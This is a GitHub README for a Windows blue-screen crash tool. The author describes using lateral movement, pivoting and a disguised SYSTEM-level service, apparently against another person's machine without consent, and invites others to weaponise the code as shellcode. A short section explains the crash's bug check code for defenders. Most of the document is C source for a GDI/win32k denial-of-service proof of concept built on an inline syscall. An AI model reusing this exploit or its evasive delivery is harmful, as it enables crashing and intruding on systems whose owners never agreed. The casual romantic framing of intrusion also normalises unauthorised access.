# BSOD
This application creates a BSOD on Windows systems

# Motivation
![212284100-561aa473-3905-4a80-b561-0d28506553ee](https://github.com/michredteam/BSOD/assets/168865716/69d95bab-def5-47ea-b2ac-1b9183711980)

The reason behind it was a ridiculously romantic act, using techniques like a lateral movementand, pivoting, leveraging NT AUTHORITY\SYSTEM as a callback to end up next to the girl I liked. This was dubbed as a custom Windows service, making its detection quite tricky. I didn't really disclose how it was called by NT AUTHORITY\SYSTEM because, as far as I checked, this vulnerability still persists. The program was developed in April 2023, with build 19045.2913. I'm not sure if it would be fixed in Windows 11, but it has been around since Windows 7. It's better not to expose this vulnerability until I'm sure it doesn't exist anymore. So, if anyone has an idea, they could tweak the code and turn it into a shellcode with AIDA. I hadn't even thought of taking things to that level, as it was just a proof of concept to impress a girl.

# TeamBlue

Now, correcting my bad habits, this is for TeamBlue. If you want to know if this is an error or if someone caused it, it would be more straightforward to put it like this.

![image](https://github.com/michredteam/BSOD/assets/168865716/5e65914d-e78c-49c5-8e50-c9088de184f3)

While the MANUALLY_INITIATED_CRASH1 bug check has a value of 0xDEADDEAD, indicating a manually initiated crash, this value can be easily manipulated to generate other errors.

# Alternative
![214375888-0dc62524-fb43-43fd-9479-098b471d1b9c](https://github.com/michredteam/BSOD/assets/168865716/3f5a65f5-aa13-46d3-8574-012073be6a4b)

I just imagined this, but in reality, there are more ways to do it.


```c_cpp
#include <Windows.h>
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
unsigned int demo_CreateBitmapIndirect(void) {
	static BITMAP bitmap = { 0, 8, 8, 2, 1, 1 };
	static BYTE bits[8][2] = { 0xFF, 0, 0x0C, 0, 0x0C, 0, 0x0C, 0,
		0xFF, 0, 0xC0, 0, 0xC0, 0, 0xC0, 0 };
	bitmap.bmBits = bits;

	SetLastError(NO_ERROR);
	HBITMAP hBitmap = CreateBitmapIndirect(&bitmap);
	return (unsigned int)hBitmap;
}

#define eSyscall_NtGdiSetBitmapAttributes 0x1110
W32KAPI HBITMAP NTAPI NtGdiSetBitmapAttributes(
	HBITMAP argv0,
	DWORD argv1
	)
{
	__asm
	{
		push argv1;
		push argv0;
		push 0x00;
		mov eax, eSyscall_NtGdiSetBitmapAttributes;
		mov edx, addr_kifastsystemcall;
		call edx;
		add esp, 0x0c;
	}
}
void Trigger_BSoDPoc() {
	HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();
	HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)0x8f9);
	RECT rect = { 0 };
	rect.left = 0x368c;
	rect.top = 0x400000;
	HRGN hRgn = (HRGN)CreateRectRgnIndirect(&rect);
	HDC hdc = (HDC)CreateCompatibleDC((HDC)0x0);
	SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);
	HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)0x00edfc13);
	FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);
}

int _tmain(int argc, _TCHAR* argv[])
{
	Trigger_BSoDPoc();
	return 0;
}

```
